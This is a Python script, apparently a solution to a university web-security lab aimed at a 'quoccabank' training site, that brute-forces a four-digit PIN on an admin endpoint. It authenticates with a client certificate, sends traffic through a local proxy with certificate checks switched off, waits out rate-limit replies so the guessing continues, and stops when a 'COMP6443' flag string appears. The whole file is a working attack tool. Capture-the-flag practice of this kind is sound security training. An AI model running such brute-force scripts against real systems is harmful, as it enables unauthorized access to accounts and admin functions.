from requests_pkcs12 import get, post
import json
import pprint
from requests import Session
from requests_pkcs12 import Pkcs12Adapter
import threading, sys, os
import requests
import time
import urllib.parse
import base58

#this is the new pw for the new cert
pw = ''

url = 'https://files.quoccabank.com/admin'

h = {
    'Content-Type' : 'application/x-www-form-urlencoded',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Origin' : 'https://haas.quoccabank.com',
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
}



def main():
    
    requests.packages.urllib3.disable_warnings() 
    #r = post(url=url,headers = headers, data=data, pkcs12_filename='new.p12', pkcs_12_password=pw)
    try:
        with Session() as s:
            
            s.mount(url,Pkcs12Adapter(pkcs12_filename='new.p12', pkcs12_password=pw))
            s.proxies = {'https' : '127.0.0.1:8080'}
            
            for i in range(9999):
                data = {"pin" : str(i)}
                print(f"trying {i}")
                status_code = -1
                while status_code != 200:
                    r = s.post(url, headers=h, data=data, verify=False)
                    status_code = r.status_code
                    if status_code == 429:
                        headers = r.headers
                        no_ms = headers['X-Retry-In'][0:-2]
                        sec = float(no_ms)
                        print(f"Retrying url {url} in {sec / 1000} seconds")
                        time.sleep(sec / 1000)
                if 'COMP6443' in r.text:
                    print(r.text)
                    break
            
    except KeyboardInterrupt:
        print("Force exiting")
        os._exit(1)


    

    
if __name__ == '__main__':
    
    main()